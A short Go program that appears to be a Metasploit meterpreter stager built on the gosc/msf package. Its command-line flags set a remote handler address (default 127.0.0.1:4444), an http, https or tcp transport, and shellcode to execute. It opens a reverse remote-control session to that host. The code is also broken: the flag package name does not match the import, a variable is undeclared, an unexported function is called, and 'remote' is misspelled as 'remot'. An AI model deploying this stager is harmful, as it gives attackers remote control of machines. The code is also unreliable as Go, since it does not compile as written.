package main

import (
	"github.com/kost/gosc/msf"
	"github.com/spf13/pflag"
)

var remote string
var method string = "https"

func ParseCommandLine() {
	flag.StringVarP(&remote, "remote", "r", "127.0.0.1:4444", "host and port to connect to")
	flag.StringVarP(&method, "method", "m", "https", "type of msf (http, https, tcp)")
	flag.StringVarP(&execute, "execute", "e", "", "Specify string argument as SC to execute")
	Parse()
}

func main() {
	ParseCommandLine()
	msf.meterpreter(method, remot)
}
